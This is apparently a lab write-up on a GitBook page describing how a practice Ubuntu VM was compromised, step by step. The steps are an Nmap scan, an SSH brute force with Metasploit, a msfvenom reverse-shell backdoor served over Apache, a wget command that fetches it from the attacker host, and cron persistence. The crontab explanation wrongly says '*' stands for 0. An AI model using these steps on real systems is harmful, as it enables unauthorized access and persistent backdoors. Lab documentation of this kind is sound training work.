---
description: >-
  A series of programs and commands were used in order to fully infect the
  Target
---

# How this VM was Compromised

For this attack strategy, the following was accomplished:

1. Use Nmap scans to determine open ports
2. Create a username and password list to run against the Victim
3. Use Metasploit to bruteforce with ssh
4. Remote SSH into the Victim with the acquired username and password
5. Run enumeration commands to find/steal data and set up a new sudoers user
6. Download the backdoor and stage on the system
7. Setup persistence of the backdoor with Cron

## **Enumeration Commands**

The first step when "infecting" the victim is to perform a port scan to locate IP addresses on the network. The command used is ^/nmap -p 22 -open 184.171.155.0/24

* \-p specifies the port, which is 22
* \-open searches for all ports that are open, as opposed to closed
* the IP address is that of the network but not just specific IPs

<figure><img src="../.gitbook/assets/image (56).png" alt=""><figcaption></figcaption></figure>

Because we know what our Victim's IP address already is, we know that we will run our more advanced scans against this specific IP address. Still, it is a very useful scan and proves that port 22 is open, which will be necessary later for SSH.

We brute force with a generated password list which was added by the attacker. Metasploit will be used as the way to brute force with SSH. The specific script that executes is the scanner/ssh/ssh\_login, which will run the password list against the specific IP we got from the Nmap port scan.

<figure><img src="../.gitbook/assets/image (62).png" alt=""><figcaption></figcaption></figure>

As you can see, the command was successful in using brute force with the generated password list. The password list just has common passwords, highlighting how often strong passwords are overlooked. &#x20;

### **Process of Creating the Backdoor on HostUbuntu**

A backdoor will be created and then hosted on an apache web page. This way, when the attacker uses remote SSH to gain access to the Victim, it will be easy to navigate to the apache webpage and download the backdoor. This is accomplished through the use of msfvenom and Metasploit.&#x20;

First, you will need to create the backdoor with ^/msfvenom. This is a command line tool that generates payloads that can be used in many different locations as well as has a variety of output options.

* \-p specifies the payload, which will be used with Metasploit
* LHOST is the IP address of the host
* LPORT can be any port
* \-f specifies as an executable
* \-o will be the name of the file

<figure><img src="../.gitbook/assets/image (4) (1).png" alt=""><figcaption></figcaption></figure>

The backdoor should be staged somewhere, so it is moved into the /var/www/html/ file location. It also has to have permissions updated, with the command ^/chmod +x windowsbackdoor.exe Then, once the apache2 service is loaded, the backdoor will also be ready.

<figure><img src="../.gitbook/assets/image (61).png" alt=""><figcaption></figcaption></figure>

For this exploitation, multi/handler will be used. This is a stub that handles exploits launched outside of the framework. We will be using the payload specifically for Linux and x86 system types. There are just about options for every type of known OS, which is Metasploit is such a popular tool.&#x20;

<figure><img src="../.gitbook/assets/image (34).png" alt=""><figcaption></figcaption></figure>

Just as with the SSH Brute Force with Metasploit, certain inputs will have to be configured before starting the exploit

* LHOST is the IP of the HostVM, not Victim
* LPORT can be any random port that is open

This will begin the reverse\_tcp shell and wait until a victim downloads the backdoor or it is installed manually.

<figure><img src="../.gitbook/assets/image (72).png" alt=""><figcaption></figcaption></figure>

### **Process of Downloading Backdoor on VictimUbuntu**

Once the backdoor is ready, we can begin to stage it in the Victim's network. With the credentials taken from the numerous scans, you can ssh login.

<figure><img src="../.gitbook/assets/image (33).png" alt=""><figcaption></figcaption></figure>

Use the wget command to manually download the backdoor on the Victim ^/wget http://184.171.155.46/windowsbackdoor.exe

<figure><img src="../.gitbook/assets/image (55).png" alt=""><figcaption></figcaption></figure>

The last step with this specific backdoor is to stage it in the /usr/local/bin with ^/mv windowsbackdoor.exe /usr/local/bin

<figure><img src="../.gitbook/assets/image (50).png" alt=""><figcaption></figcaption></figure>

Once the backdoor is in place, the last step regarding persistence is to set up the crontab. This way, the backdoor will constantly be downloaded to the Victims network at a specific interval, set by the attacker. The first time you use the command ^/crontab -e/, you will be required to select an editor. This crontab is located in /var/spool/cron.

<figure><img src="../.gitbook/assets/image (19).png" alt=""><figcaption></figcaption></figure>

Then, this is one place to store your cron jobs. There is also a crontab known as system-wide and is in a different file location than the normal crontab. In this case, the attacker set up cron jobs in both locations. The second location for crontab is in /etc/crontab.

<figure><img src="../.gitbook/assets/image (63).png" alt=""><figcaption></figcaption></figure>

It is required for cron to be reset before any scheduling jobs can begin. As for the actual crontab syntax, it is quite basic. First, you enter schedule, which is a combination of

* Minutes
* Hours
* Days of the Month
* Months
* Days of the Week

These are represented by \* when the value is 0. For example, 30 17 \* \* 2 will run a command every Tuesday at 5:30 PM

The second half of the syntax is the actual command to run. It can be quite a complex command or something simple like a wget.

<figure><img src="../.gitbook/assets/image (64).png" alt=""><figcaption></figcaption></figure>

**All of the aspects that were added to the VM were done so during the process of remote SSH.**

